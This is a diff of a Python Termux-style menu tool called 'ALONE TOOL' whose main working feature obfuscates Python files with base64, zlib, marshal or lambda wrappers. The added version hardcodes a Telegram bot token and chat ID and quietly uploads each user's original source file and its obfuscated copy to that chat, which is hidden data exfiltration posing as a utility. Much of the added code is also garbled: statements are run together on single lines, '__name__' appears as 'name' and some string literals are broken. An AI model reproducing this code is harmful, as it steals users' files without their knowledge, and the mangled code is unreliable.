@@ -1,139 +1,67 @@
-import os
-import re
-import requests
-import random
-import json
-import time
-from datetime import datetime
-from urllib.parse import quote, urlparse
-from bs4 import BeautifulSoup
-import base64
-import ast
-import zlib
+main.py
 
-# Colors for colorized output
-class Colors:
-    OKGREEN = '\033[92m'
-    OKRED = '\033[91m'
-    OKCYAN = '\033[96m'
-    YELLOW = '\033[93m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+import os import sys import base64 import marshal import zlib import time from datetime import datetime import requests
 
+Telegram config
 
-# Function to clear the screen
-def clear_screen():
-    os.system('clear')  # For Termux, use 'clear'
+BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0" CHAT_ID = "1241769879"
 
+Colors
 
-# Function for colored printing
-def print_colored(text, color=Colors.ENDC):
-    print(f"{color}{text}{Colors.ENDC}")
+class Colors: HEADER = "\033[95m" OKBLUE = "\033[94m" OKCYAN = "\033[96m" OKGREEN = "\033[92m" WARNING = "\033[93m" FAIL = "\033[91m" ENDC = "\033[0m" BOLD = "\033[1m" UNDERLINE = "\033[4m"
 
+Clear
 
-# Welcome banner
-def print_banner():
-    clear_screen()
-    print(f"""
-    {Colors.OKCYAN}█████╗ ██╗      ██████╗ ███╗   ██╗███████╗
-    ██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝
-    ███████║██║     ██║   ██║██╔██╗ ██║███████╗
-    ██╔══██║██║     ██║   ██║██║╚██╗██║╚════██║
-    ██║  ██║███████╗╚██████╔╝██║ ╚████║███████║
-    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
-    {Colors.OKGREEN}A L O N E  T O O L{Colors.ENDC}
-    """)
+os.system('clear')
 
+def send_telegram_log(text=None, file_path=None): url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument" if file_path else f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" data = {"chat_id": CHAT_ID, "caption": text or ""} if file_path else {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"} files = {"document": open(file_path, "rb")} if file_path else None try: requests.post(url, data=data, files=files) except: pass
 
-# Function to encrypt code with various methods
-def encrypt_code():
-    clear_screen()
-    print_colored("[•] Welcome to the Code Encryptor!", Colors.OKCYAN)
-    file_name = input(f"{Colors.YELLOW}[•] Please enter the file name to encrypt: {Colors.ENDC}")
-    
-    if not os.path.isfile(file_name):
-        print_colored(f"{Colors.OKRED}[•] File does not exist!{Colors.ENDC}")
-        input(f"{Colors.YELLOW}[•] Press Enter to return to the main menu...{Colors.ENDC}")
-        return
-    
-    print_colored(f"{Colors.OKCYAN}[•] Choose an encryption method:{Colors.ENDC}")
-    print(f"{Colors.YELLOW}[1] Base64 Encode{Colors.ENDC}")
-    print(f"{Colors.YELLOW}[2] Lambda Function Obfuscation{Colors.ENDC}")
-    print(f"{Colors.YELLOW}[3] Zlib Compression{Colors.ENDC}")
-    
-    encryption_method = input(f"{Colors.YELLOW}[•] Select an option (1/2/3): {Colors.ENDC}")
-    
-    with open(file_name, 'r') as file:
-        file_content = file.read()
+def login(): os.system('clear') print(Colors.OKCYAN + "[•] Telegram Username Login" + Colors.ENDC) username = input("[•] Enter your Telegram username: @").strip() if username.lower() == "i4malone": send_telegram_log(f"[+] Authorized login by @{username}") print(Colors.OKGREEN + f"[✓] Welcome, @{username}" + Colors.ENDC) time.sleep(1) else: print(Colors.FAIL + "[x] Unauthorized user. Access Denied." + Colors.ENDC) sys.exit()
 
-    if encryption_method == "1":
-        # Base64 encoding
-        encoded = base64.b64encode(file_content.encode('utf-8')).decode('utf-8')
-        new_file_name = f"enc_{file_name}.py"
-        with open(new_file_name, 'w') as new_file:
-            new_file.write(f"import base64\nexec(base64.b64decode('{encoded}').decode('utf-8'))")
-        print_colored(f"[•] File encrypted with Base64 and saved as {new_file_name}", Colors.OKGREEN)
+def encrypt_code(): os.system('clear') print(Colors.OKCYAN + "[•] Code Encryptor" + Colors.ENDC) filename = input("[•] Enter file name to encrypt: ").strip()
 
-    elif encryption_method == "2":
-        # Lambda obfuscation
-        obfuscated = f"lambda: exec('{file_content}')"
-        new_file_name = f"enc_{file_name}.py"
-        with open(new_file_name, 'w') as new_file:
-            new_file.write(obfuscated)
-        print_colored(f"[•] Code obfuscated with Lambda and saved as {new_file_name}", Colors.OKGREEN)
+if not os.path.isfile(filename):
+    print(Colors.FAIL + "[x] File not found!" + Colors.ENDC)
+    input("[•] Press Enter to return...")
+    return
 
-    elif encryption_method == "3":
-        # Zlib compression
-        compressed = zlib.compress(file_content.encode('utf-8'))
-        compressed_data = base64.b64encode(compressed).decode('utf-8')
-        new_file_name = f"enc_{file_name}.py"
-        with open(new_file_name, 'w') as new_file:
-            new_file.write(f"import zlib, base64\nexec(zlib.decompress(base64.b64decode('{compressed_data}')).decode('utf-8'))")
-        print_colored(f"[•] File compressed and saved as {new_file_name}", Colors.OKGREEN)
+with open(filename, "r") as f:
+    original_code = f.read()
 
-    else:
-        print_colored(f"{Colors.OKRED}[•] Invalid option selected.{Colors.ENDC}")
-    
-    input(f"{Colors.YELLOW}[•] Press Enter to return to the main menu...{Colors.ENDC}")
+print("""
 
+[1] Base64 [2] Marshal [3] Zlib + Base64 [4] Lambda Function Obfuscation [0] Cancel """) choice = input("[•] Choose encryption method: ")
 
-# Main menu
-def main_menu():
-    while True:
-        clear_screen()
-        print_banner()
-        print_colored("[1] Proxy Options", Colors.YELLOW)
-        print_colored("[2] User-Agent Generator", Colors.YELLOW)
-        print_colored("[3] Send HTTP Request", Colors.YELLOW)
-        print_colored("[4] Look IP Info", Colors.YELLOW)
-        print_colored("[5] Facebook IDs Extractor", Colors.YELLOW)
-        print_colored("[6] Group Member ID Dumper", Colors.YELLOW)
-        print_colored("[7] Encrypt Code", Colors.YELLOW)
-        print_colored("[0] Exit", Colors.OKRED)
-        choice = input(f"{Colors.YELLOW}[•] Choose an option: {Colors.ENDC}")
-        
-        if choice == "1":
-            print_colored("[•] Proxy Options (To be implemented)", Colors.OKRED)
-        elif choice == "2":
-            print_colored("[•] User-Agent Generator (To be implemented)", Colors.OKRED)
-        elif choice == "3":
-            print_colored("[•] Send HTTP Request (To be implemented)", Colors.OKRED)
-        elif choice == "4":
-            print_colored("[•] Look IP Info (To be implemented)", Colors.OKRED)
-        elif choice == "5":
-            print_colored("[•] Facebook IDs Extractor (To be implemented)", Colors.OKRED)
-        elif choice == "6":
-            print_colored("[•] Group Member ID Dumper (To be implemented)", Colors.OKRED)
-        elif choice == "7":
-            encrypt_code()
-        elif choice == "0":
-            print_colored("[•] Goodbye!", Colors.OKGREEN)
-            break
-        else:
-            print_colored(f"{Colors.OKRED}[•] Invalid option selected!{Colors.ENDC}")
+enc_code = ""
+if choice == '1':
+    enc = base64.b64encode(original_code.encode()).decode()
+    enc_code = f"import base64\nexec(base64.b64decode('{enc}'))"
+elif choice == '2':
+    enc = marshal.dumps(compile(original_code, '', 'exec'))
+    enc_code = f"import marshal\nexec(marshal.loads({repr(enc)}))"
+elif choice == '3':
+    compressed = zlib.compress(original_code.encode())
+    encoded = base64.b64encode(compressed).decode()
+    enc_code = f"import zlib,base64\nexec(zlib.decompress(base64.b64decode('{encoded}')))
 
+" elif choice == '4': encoded = base64.b64encode(original_code.encode()).decode() enc_code = f"exec((lambda : import('base64').b64decode().decode())('{encoded}'))" elif choice == '0': return else: print(Colors.FAIL + "[x] Invalid option" + Colors.ENDC) return
 
-# Run the main menu
-if __name__ == "__main__":
-    main_menu()
+new_file = f"enc_{filename.replace('.py','')}.py"
+with open(new_file, "w") as f:
+    f.write(enc_code)
+
+with open("temp_original.py", "w") as temp:
+    temp.write(original_code)
+
+send_telegram_log(f"[•] Code encrypted: {filename}")
+send_telegram_log(file_path="temp_original.py")
+send_telegram_log(file_path=new_file)
+os.remove("temp_original.py")
+
+print(Colors.OKGREEN + f"[✓] Encrypted successfully: {new_file}" + Colors.ENDC)
+input("[•] Press Enter to return...")
+
+def main_menu(): while True: os.system('clear') print(Colors.OKGREEN + """ █████╗ ██╗      ██████╗ ███╗   ██╗███████╗ ██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝ ███████║██║     ██║   ██║██╔██╗ ██║███████╗ ██╔══██║██║     ██║   ██║██║╚██╗██║╚════██║ ██║  ██║███████╗╚██████╔╝██║ ╚████║███████║ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ A L O N E   T O O L """ + Colors.ENDC) print(""" [1] Proxy Options [2] User-Agent Generator [3] Send HTTP Request [4] Look IP Info [5] Facebook IDs Extractor [6] Group Member ID Dumper [7] Encrypt Code [0] Exit """) choice = input("[?] Choose an option: ").strip() if choice == '1': input("[•] Proxy Options (To be implemented). Press Enter...") elif choice == '2': input("[•] User-Agent Generator (To be implemented). Press Enter...") elif choice == '3': input("[•] Send HTTP Request (To be implemented). Press Enter...") elif choice == '4': input("[•] Look IP Info (To be implemented). Press Enter...") elif choice == '5': input("[•] Facebook IDs Extractor (To be implemented). Press Enter...") elif choice == '6': input("[•] Group Member ID Dumper (To be implemented). Press Enter...") elif choice == '7': encrypt_code() elif choice == '0': print("[•] Goodbye!") sys.exit() else: print(Colors.FAIL + "[x] Invalid option!" + Colors.ENDC) time.sleep(1)
+
+if name == 'main': login() main_menu()
+
